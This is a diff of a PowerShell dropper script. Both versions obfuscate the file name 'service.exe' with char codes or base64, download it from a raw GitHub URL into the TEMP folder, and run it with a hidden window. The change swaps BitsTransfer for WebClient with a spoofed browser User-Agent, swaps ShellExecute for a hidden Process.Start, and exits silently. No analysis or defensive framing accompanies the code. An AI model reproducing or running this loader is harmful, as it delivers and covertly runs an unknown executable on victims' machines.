@@ -1,22 +1,21 @@
-$n = -join [char[]](115,101,114,118,105,99,101)
-$x = -join [char[]](46,101,120,101)
-$p = [IO.Path]::Combine([Environment]::GetEnvironmentVariable('TEMP'), $n + $x)
+$n = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmljZQ=='))
+$x = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('LmV4ZQ=='))
+$p = [IO.Path]::Combine($env:TEMP, $n + $x)
 
 $a = 'https://github.com/matvejsklarov9-cyber/'
 $b = 'my/raw/refs/heads/main/'
 $u = $a + $b + $n + $x
 
-Import-Module BitsTransfer -Verbose:$false -WarningAction SilentlyContinue
-Start-BitsTransfer -Source $u -Destination $p -Priority Foreground -ErrorAction SilentlyContinue
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+try { $wc.DownloadFile($u, $p) } catch {}
 
-if (-not (Test-Path $p)) {
-    $r = [Net.WebRequest]::Create($u)
-    $r.UserAgent = 'Mozilla/5.0'
-    $s = $r.GetResponse().GetResponseStream()
-    $f = [IO.File]::Create($p); $s.CopyTo($f); $f.Close(); $s.Close()
+if (Test-Path $p) {
+    $si = New-Object System.Diagnostics.ProcessStartInfo
+    $si.FileName = $p
+    $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $si.CreateNoWindow = $true
+    [System.Diagnostics.Process]::Start($si) | Out-Null
 }
 
-$sh = New-Object -ComObject ('Shell.' + 'Application')
-$sh.ShellExecute($p, '', '', 'open', 0)
-
-Stop-Process -Id $PID -Force
+[Environment]::Exit(0)
